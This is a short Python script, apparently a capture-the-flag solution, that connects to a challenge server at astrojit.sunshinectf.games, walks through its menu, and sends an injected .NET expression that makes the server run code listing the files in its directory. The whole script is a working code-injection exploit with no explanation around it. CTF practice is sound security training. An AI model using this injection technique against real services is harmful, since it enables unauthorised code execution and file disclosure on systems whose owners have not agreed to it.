import socket
import time

payload = '{System.String.Join(",",System.IO.Directory.GetFiles("."))}'

def recvall(sock):
    sock.settimeout(2.0)
    data = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except Exception:
            break
    return data

with socket.create_connection(("astrojit.sunshinectf.games", 25006)) as s:
    time.sleep(0.3)
    print(recvall(s).decode('utf-8', 'ignore'), end='', flush=True)
    s.sendall(b"\n")
    time.sleep(0.2)
    print(recvall(s).decode('utf-8', 'ignore'), end='', flush=True)
    s.sendall(b"1\n")
    time.sleep(0.2)
    print(recvall(s).decode('utf-8', 'ignore'), end='', flush=True)
    s.sendall(payload.encode() + b"\n")
    time.sleep(1.0)
    print(recvall(s).decode('utf-8', 'ignore'), end='', flush=True)
    s.sendall(b"4\n")
    time.sleep(1.0)
    print(recvall(s).decode('utf-8', 'ignore'), end='', flush=True)
